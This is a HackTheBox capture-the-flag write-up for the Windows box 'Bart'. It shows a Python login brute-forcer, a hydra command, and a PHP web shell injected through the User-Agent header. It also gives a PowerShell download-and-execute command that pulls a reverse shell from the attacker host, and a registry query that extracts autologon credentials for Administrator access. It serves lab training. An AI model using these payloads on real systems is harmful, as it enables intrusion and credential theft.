---
title: "HackTheBox Writeup: Bart"
date: 2019-10-09T19:41:33+02:00
toc: true
showdate: true
tags:
  - ctf
  - writeup
  - hackthebox
---

Bart was a lot of fun, it did involve a bit of guessing with the two bruteforcing phases, but neither of them were very hard and a bit of rational guessing was enough to solve the first of the two, so it wasn't a handicap.

This was also the box that taught me how important it is to check whether the running environment is 32 or 64 bits for both current process and operating system, a bit more about how the SysWOW64 emulator works, and it's the first box that let me find credentials inside the WinLogon registry keys for automatic logins that I used to elevate my permissions to Administrator through a PSSession. Overall, a very nice and realistic Windows box.

![img](/images/writeup-bart/1.png)

---

## Enumeration

![img](/images/writeup-bart/2.png)

There appears to be only a Microsoft IIS web server running on the box and from its version we can tell the operating system of Bart is either Windows 10 or Windows Server 2016. Connecting to http://10.10.10.81/ takes the browser into trying to resolve the domain forum.bart.htb and because it can't find its IP address in the default DNS servers it fails to load:

![img](/images/writeup-bart/3.png)

So let's add Bart's domains to our /etc/hosts file:

![img](/images/writeup-bart/4.png)

And we can see the webpage of forum.bart.htb:

![img](/images/writeup-bart/5.png)

Further down in the page are shown the three employees of this company, hovering on the images of these people with the mouse shows a bunch of fake social media buttons and one that for email contact, which shows us the email addresses of each one of the team members:

![img](/images/writeup-bart/6.png)

So we have three email addresses that could come useful later:

```aaa
s.brown@bart.local --> Samantha Brown
d.simmons@bart.htb --> Daniel Simmons
r.hilton@bart.htb --> Robert Hilton
Daniella Lamborghini --> no email
```

Plus, looking at the source code reveals another commented out person's information:

![img](/images/writeup-bart/7.png)

So we can add another one to the list:

```aaa
h.potter@bart.htb --> Harvey Potter
```

There doesn't seem to be anything interesting on the page except for the fact that the website says it's powered by WordPress when in the source there are no references to WordPress resources. Let's look for content using dirb, starting from the mail domain bart.htb:

![img](/images/writeup-bart/8.png)

An URL to PHP Server Monitor is found:

![img](/images/writeup-bart/9.png)

Another weird thing is that the version mentioned in the link at the bottom is v3.2.1, but on the official website the latest version is v3.2.0:

![img](/images/writeup-bart/10.png)

Trying to guess credentials on this page won't take us anywhere and we don't even know if the usernames we are trying are correct or not because the error message we receive is always the same and won't change even if the user exists:

![img](/images/writeup-bart/11.png)

However clicking the "Forgot password?" cutton takes us to a page where we can tell whether a user exists or not:

![img](/images/writeup-bart/12.png)

So we can try cycling through the employees' names we found earlier to see if there are any existing accounts for them, and it turns out the commented out team member, the developer, has an account called "harvey":

![img](/images/writeup-bart/13.png)

Now that we have a valid username we can try bruteforcing passwords, in just a few tries I guess right: "potter" is the password, the developer's last name. So the credentials for the monitor page are just first and last name of the developer:

```aaa
User: harvey
Pass: potter
```

Also thanks to [0xdf's writeup](https://0xdf.gitlab.io/2018/07/15/htb-bart.html) I discovered the very cool little tool cewl, which allowed him to build a small dictionary out of the information found from the forum page:

```aaa
$ cewl -w cewl-forum.txt -e -a http://forum.bart.htb
```

I didn't go for this approach because the login page has a CSRF token so I didn't fee like scripting a bruteforcer just for this box, however here is 0xdf's code:

```python
#!/usr/bin/env python3

import reimport requestsimport sysfrom multiprocessing import Pool


MAX_PROC = 50url = "http://monitor.bart.htb/"username = "harvey"

#<input type="hidden" name="csrf" value="aab59572a210c4ee1f19ab55555a5d829e78b8efdbecd4b2f68bd485d82f0a57" />csrf_pattern = re.compile('name="csrf" value="(\w+)" /')

def usage():
   print("{} [wordlist]".format(sys.argv[0]))
   print("  wordlist should be one word per line]")
   sys.exit(1)

def check_password(password):

   # get csrf token and PHPSESSID
   r = requests.get(url)
   csrf = re.search(csrf_pattern, r.text).group(1)
   PHPSESSID = [x.split('=')[1] for x in r.headers['Set-Cookie'].split(';') if x.split('=')[0] == 'PHPSESSID'][0]

   # try login:
   data = {"csrf": csrf,
           "user_name": username,
           "user_password": password,
           "action": "login"}
   proxies = {'http': 'http://127.0.0.1:8080'}
   headers = {'Cookie': "PHPSESSID={}".format(PHPSESSID)}
   r = requests.post(url, data=data, proxies=proxies, headers=headers)

   if '<p>The information is incorrect.</p>' in r.text:
       return password, False
   else:
       return password, True


def main(wordlist, nprocs=MAX_PROC):
   with open(wordlist, 'r', encoding='latin-1') as f:
      words = f.read().rstrip().replace('\r','').split('\n')

   words = [x.lower() for x in words] + [x.capitalize() for x in words] + words + [x.upper() for x in words]

   pool = Pool(processes=nprocs)

   i = 0
   print_status(0, len(words))
   for password, status in pool.imap_unordered(check_password, [pass_ for pass_ in words]):
       if status:
           sys.stdout.write("\n[+] Found password: {} \n".format(password))
           pool.terminate()
           sys.exit(0)
       else:
           i += 1
           print_status(i, len(words))

   print("\n\nPassword not found\n")

def print_status(i, l, max=30):
   sys.stdout.write("\r|{}>{}|  {:>15}/{}".format( "=" * ((i*max)//l), " " * (max - ((i*max)//l)), i, l))

if __name__ == '__main__':
   if len(sys.argv) != 2:
       usage()
   main(sys.argv[1])
```

Logging in redirects to monitor.bart.htb which of course doesn't load, so I refresh the page after updating /etc/hosts again:

![img](/images/writeup-bart/14.png)

It appears that there is an internal chat in yet another domain:

![img](/images/writeup-bart/15.png)

It presents a second login form:

![img](/images/writeup-bart/16.png)

Once reached this point there are two ways to continue.

---

## Login method 1: bruteforce

After a few blind attempts I can tell that the password must be at least 8 characters long and this login form doesn't tell when the username exists or not, so I'm going to keep using "harvey" as username and bruteforce its password with hydra, since this time "potter" isn't the solution to our problems:

```aaa
$ hydra -l harvey -P /usr/share/wordlists/metasploit/common_roots.txt internal-01.bart.htb http-form-post "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=Login:Password"
```

The syntax is hydra works as such:

- I specify what username to use with -l
- the -P tells to use a wordlist for the password attempts, I used a wordlist of common password provided by Metasploit
- the third parameter is the base domain of the target: internal-01-bart.htb
- what follows is the protocol and method of authentication: HTTP form POST because the credentials are sent to the server with a POST HTTP request and from said request we can see the name of the parameters are "uname" for the username and "passwd" for the password, plus a third value representing the button's submit action is also included in the request "submit=Login". All this can be observed from either the browser's developer tools or by setting up Burp as a proxy
- the last parameter is a string divided in three parts: the location of the login page, the list of parameters to be sent in the HTTP requests (^USER^ and ^PASS^ are where hydra will place the username and passwords for each attempt), and finally a string that hydra needs to know when to consider an attempt failed, in this case I wrote "Password" beacuse when the password is incorrect a prompt with "Password" will pop up in the page. Each one of these fields is separated with a colon ":"


Hydra eventually finds the password:

![img](/images/writeup-bart/17.png)

```aaa
User: harvey
Pass: Password1
```

---

## Login method 2: account registration from hidden page

Looking at the source, URL, and researching a bit on Google reveals that the chat is taken from [here](https://github.com/magkopian/php-ajax-simple-chat) so now we know what pages are on the domain and how they work.

On the original application users can create new accounts, there should be a link to the registration page on the home but it's been removed from the source and register_form.php has been removed from the server altogether, however if we take a look with gobuster we can find Register.php still exists on the site:

```aaa
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -u http://internal-01.bart.htb/simple_chat/ -x php
```

![img](/images/writeup-bart/18.png)

By reading the code of the original application it turns out it's register.php the page that actually creates the account, and since it already exists we can POST credentials to it manually with curl and it will create us a new account without having to brute the existing one:

```aaa
$ curl -X POST http://internal-01.bart.htb/simple_chat/register.php -d "uname=baud&passwd=password!"
```
![img](/images/writeup-bart/19.png)

Either way now we have access to the chat system and from a first glance nothing stands out:

![img](/images/writeup-bart/20.png)

But in the source code there is some JS code that didn't exist in the original application, and it comes from the Log link:

```javascript
<div id="log_link">
    <script>
        function saveChat() {
            // create a serialized object and send to log_chat.php. Once done hte XHR request, alert "Done"
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE) {
                    alert(xhr.responseText);
                }
            }
            xhr.open('GET', 'http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey', true);
            xhr.send(null);
            alert("Done");
        }
    </script>
    <a href="#" onclick="saveChat()">Log</a>
</div>
```

When we click on the link a GET is generated for this address:

```aaa
http://internal-01.bart.htb/log/log.php?filename=log.txt&username=harvey
```

We can open this address from the browser and all we see is a "1". The number becomes 0 if the username parameter is set to a user that doesn't exist or if the filename parameter points to a file that cannot be open for writing, however this is not the content of the log.txt file itself, we can find the actual file inside the /log/ folder, the same one where log.php is, and it appears to have logged our user agent:

![img](/images/writeup-bart/21.png)

---

## Exploitation: log file poisoning

So from what we have gathered so far we can tell that the way log.php works is, you specify a filename where the logs will be written to, an existing user, and the page will write the current date, the selected user, and the user agent on the file. This means we can manipulate the requests to inject whatever we like in the user agent string, potentially a PHP web shell which can be written in a brand new PHP file. I'm going to change my user agent amd filename parameter with Burp to inject a simple PHP cmd shell on a new webpage:

```http
GET /log/log.php?filename=baudy.php&username=harvey HTTP/1.1
Host: internal-01.bart.htb
User-Agent: <?php system($_REQUEST['cmd']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=4j2gp67fs46vgvd9mr9ibgoc47
Upgrade-Insecure-Requests: 1
```

In this first request we tell the log.php file to write the user agent in a new file called baudy.php (it'll be created in the same folder of the page, so /log/) and our user agent contains PHP code to execute an operating system command taken from the "cmd" parameter that can pass from the URL. The following request always from Burp connects to our shell and executes a whoami command:

![img](/images/writeup-bart/22.png)

With this simple and very basic shell we can already execute a bunch of useful instructions, to make them work with special characters from Burp I first URL-encode them with Burps's own Decoder tab. For example "dir c:\users" becomes:

```aaa
cmd=%64%69%72%20%63%3a%5c%75%73%65%72%73
```
And the output of the command is:

```aaa
[2019-08-11 21:22:55] - harvey -  Volume in drive C has no label.
Volume Serial Number is F84E-9CF7

Directory of c:\users

04/10/2017  09:13    <DIR>          .
04/10/2017  09:13    <DIR>          ..
04/02/2018  22:58    <DIR>          Administrator
02/10/2017  13:08    <DIR>          DefaultAppPool
04/10/2017  08:40    <DIR>          forum.bart.local
21/02/2018  22:39    <DIR>          h.potter
24/09/2017  21:55    <DIR>          Harvey Potter
04/02/2018  22:56    <DIR>          internal.bart.local
04/10/2017  08:42    <DIR>          monitor.bart.local
06/02/2018  11:15    <DIR>          privileged
21/02/2018  22:45    <DIR>          Public
02/10/2017  13:08    <DIR>          test
               0 File(s)              0 bytes
              12 Dir(s)  15,725,846,528 bytes free
```

From this account we don't seem to have permissions to open any of these folders. To better enumerate the system it's more convenient to spawn a real reverse shell so I'll be using Nishang's Invoke-PowerShellTcp.ps1, in Parrot it's located at the following path:

```aaa
/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
```

I added an extra line at the end of the script to start the connection to our host automatically as soon as the script is executed:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.29 -Port 9999
```

And then sent this command in the cmd parameter of my web shell to load the script in PowerShell directly from our host:

```powershell
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.29:9090/ps_bart.ps1')
```

This long command will result in this GET request which will trigger our shell:

```http
GET /log/baudy.php?cmd=%70%6f%77%65%72%73%68%65%6c%6c%20%49%45%58%28%4e%65%77%2d%4f%62%6a%65%63%74%20%4e%65%74%2e%57%65%62%43%6c%69%65%6e%74%29%2e%64%6f%77%6e%6c%6f%61%64%53%74%72%69%6e%67%28%27%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%34%2e%32%39%3a%39%30%39%30%2f%70%73%5f%62%61%72%74%2e%70%73%31%27%29%22 HTTP/1.1
Host: internal-01.bart.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: PHPSESSID=4j2gp67fs46vgvd9mr9ibgoc47
Upgrade-Insecure-Requests: 1
```

After starting a listener, an HTTP server to host the script, and sending the request we receive the shell, but unfortunately for some reason each character I pressed in the shell would be appended to a carriage return and is thus intepreted as a command, giving errors at every key press. I don't know why this was the case, but I solved it by just copying-pasting the commands in the shell at once, the output still begins from the same line of the input though so I apologize for the annoyance and poor readability of the following screenshots.

![img](/images/writeup-bart/23.png)

---

## Spawning a 64 bits process

A few common operations to perform once a shell is spawned is to check the kind of environment we're running under, the following PS instructions can tell us whether we are in a 64 bits operating system and process:

```powershell
[Environment]::Is64BitProcess
[Environment]::Is64BitOperatingSystem
```

![img](/images/writeup-bart/24.png)

It appears that Bart is a 64 bits box but our process is running under the 32 bits emulation, and this will screw up our results a lot, in fact, Windows' 32 bits emulation isolates processes, libraries, and registry keys from the rest of the system, so a lot of data would be invisible to our eyes if we remained in this 32 bits process. To get out of the emulation we have two possibilities:

- Run PowerShell from the sysnative folder by specifying its path
- Download nc64.exe on the box and run it to get a new 64 bits shell

The first method works by forcing the execution of the 64 bits version of PowerShell from the sysnative virtual folder (it's a folder that is made exclusively to circumvent the 32 bits emulation redirecting all calls to windows32 up to syswow64, which is where the 32 bits binaries reside, so it's made for 32 bits processes to access 64 bits programs), by including an absolute path to the PS executable in the command our shell will be spawned in a 64 bits process. The modified command is the following:

```powershell
c:\windows\sysnative\windowspowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.29:9090/ps_bart.ps1')"
```

By checking again the trick worked:

![img](/images/writeup-bart/25.png)

And we can now start with our enumeration.

---

## Privilege escalation: gathering AutoLogin credentials

Scripts like PowerUp can be used to automate the process of looking for misconfigured policies and settings or juicy info but it can also be done manually, and one of the operations that brought results back was looking in the registry for credentials of autologins:

```aaa
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

![img](/images/writeup-bart/26.png)

We can become Administrator by spawning a PSSession with the newly found credentials:

```powershell
$pw = ConvertTo-SecureString -string "3130438f31186fbaf962f407711faddb" -AsPlainText -force;
$pp = new-object -typename System.Management.Automation.PSCredential -ArgumentList "BART\Administrator", $pw;
Enter-PSSession -ComputerName localhost -Credential $pp
```

From the PSSession we can run commands using this syntax:

```powershell
Invoke-Command -ScriptBlock { command }
```

![img](/images/writeup-bart/27.png)

And finally as administrators we have access to both flags (for some reason user.txt is NOT in a desktop folder this time around):

![img](/images/writeup-bart/28.png)

![img](/images/writeup-bart/29.png)




